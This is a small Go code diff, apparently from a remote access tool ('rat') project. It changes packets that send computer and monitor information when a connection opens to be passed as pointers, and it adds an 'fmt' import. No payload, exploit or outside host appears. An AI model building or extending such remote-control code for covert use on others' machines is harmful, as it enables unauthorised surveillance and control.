@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/binary"
+	"fmt"
 	"net"
 	"rat/common"
 	"rat/network"
@@ -16,8 +17,8 @@ type Connection struct {
 var Queue chan OutgoingPacket
 
 func (c *Connection) Init() {
-	Queue <- ComputerInfoPacket{}
-	Queue <- MonitorsPacket{}
+	Queue <- &ComputerInfoPacket{}
+	Queue <- &MonitorsPacket{}
 }
 
 func (c *Connection) Close() {
